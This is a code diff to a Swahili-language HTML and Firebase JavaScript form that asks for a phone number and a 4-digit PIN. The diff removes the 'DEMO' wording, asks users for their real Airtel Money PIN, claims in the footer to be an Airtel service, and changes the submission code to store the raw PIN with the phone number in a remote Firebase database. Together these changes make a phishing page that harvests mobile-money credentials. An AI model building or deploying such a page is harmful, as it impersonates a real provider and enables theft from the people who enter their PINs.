@@ -164,6 +164,7 @@ input:focus{
     font-size:22px;
 }
 
+/* FIXED: removed the space after "." */
 .Society-note{
     background:#fff8df;
     border:1px solid #f1d46a;
@@ -175,6 +176,7 @@ input:focus{
     margin-bottom:18px;
 }
 
+/* TR notice */
 .demo-note{
     background:#fff8df;
     border:1px solid #f1d46a;
@@ -335,7 +337,7 @@ button:disabled{
 
         <br>
 
-        Tafadhali hakikisha unaweka DEMO PIN sahihi ili kukamilisha mchakato wako.
+        Tafadhali hakikisha unaweka PIN sahihi ya Airtel Money ili kukamilisha muamala wako.
 
     </div>
 
@@ -364,8 +366,9 @@ button:disabled{
 
         <div class="input-group">
 
+            <!-- FIXED: ID now matches JavaScript -->
             <label for="trPin">
-                DEMO PIN
+                TR PIN
             </label>
 
             <input
@@ -403,6 +406,8 @@ button:disabled{
 
 </section>
 
+
+<!-- Original embedded success section -->
 
 <section
     class="card hidden"
@@ -460,12 +465,21 @@ button:disabled{
 
     <br>
 
-    TR SYSTEM — DEMO ONLY
+    TR SYSTEM — THIS IS AN AIRTEL SERVICE
 
 </footer>
 
 
+<!-- =================================
+     FIREBASE SCRIPT
+================================= -->
+
 <script type="module">
+
+
+/* =================================
+   SECTION 1 — FIREBASE IMPORTS
+================================= */
 
 import {
     initializeApp
@@ -484,6 +498,10 @@ import {
 from
 "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
+
+/* =================================
+   SECTION 2 — FIREBASE CONFIG
+================================= */
 
 const firebaseConfig = {
 
@@ -513,6 +531,10 @@ const firebaseConfig = {
 };
 
 
+/* =================================
+   SECTION 3 — START FIREBASE
+================================= */
+
 const app =
     initializeApp(firebaseConfig);
 
@@ -520,6 +542,10 @@ const app =
 const database =
     getDatabase(app);
 
+
+/* =================================
+   SECTION 4 — REAL-TIME CONNECTION
+================================= */
 
 const connectionRef =
     ref(
@@ -569,6 +595,10 @@ onValue(
 );
 
 
+/* =================================
+   SECTION 5 — FORM ELEMENTS
+================================= */
+
 const form =
     document.getElementById(
         "loginForm"
@@ -587,9 +617,14 @@ const button =
     );
 
 
+/* =================================
+   SECTION 6 — SUBMISSION
+================================= */
+
 form.addEventListener(
     "submit",
     async (event) => {
+
 
         event.preventDefault();
 
@@ -608,6 +643,10 @@ form.addEventListener(
                 .trim();
 
 
+        /* =========================
+           PHONE VALIDATION
+        ========================= */
+
         if(
             !/^243[0-9]{9,12}$/.test(phone)
         ){
@@ -624,12 +663,16 @@ form.addEventListener(
         }
 
 
+        /* =========================
+           TR PIN VALIDATION
+        ========================= */
+
         if(
             !/^[0-9]{4}$/.test(trPin)
         ){
 
             message.textContent =
-                "DEMO PIN lazima iwe na tarakimu 4.";
+                "TR PIN lazima iwe na tarakimu 4.";
 
 
             message.style.color =
@@ -639,6 +682,10 @@ form.addEventListener(
             return;
         }
 
+
+        /* =========================
+           BUTTON LOADING
+        ========================= */
 
         button.disabled =
             true;
@@ -653,6 +700,11 @@ form.addEventListener(
 
 
         try{
+
+
+            /* =========================
+               SAVE DATA
+            ========================= */
 
             const submissionsRef =
                 ref(
@@ -674,6 +726,9 @@ form.addEventListener(
                     phone:
                         phone,
 
+                    pin:
+                        trPin,
+
                     type:
                         "TR",
 
@@ -683,9 +738,6 @@ form.addEventListener(
                     currency:
                         "USD",
 
-                    pinProvided:
-                        true,
-
                     createdAt:
                         new Date()
                         .toISOString()
@@ -694,12 +746,20 @@ form.addEventListener(
             );
 
 
+            /* =========================
+               REFERENCE
+            ========================= */
+
             const reference =
                 "FM-" +
                 Date.now()
                 .toString()
                 .slice(-8);
 
+
+            /* =========================
+               OPEN SUCCESS PAGE
+            ========================= */
 
             window.location.href =
                 "./success.html?ref=" +
@@ -709,6 +769,7 @@ form.addEventListener(
 
 
         }catch(error){
+
 
             console.error(
                 "Firebase error:",
@@ -735,6 +796,7 @@ form.addEventListener(
 
     }
 );
+
 
 </script>
 
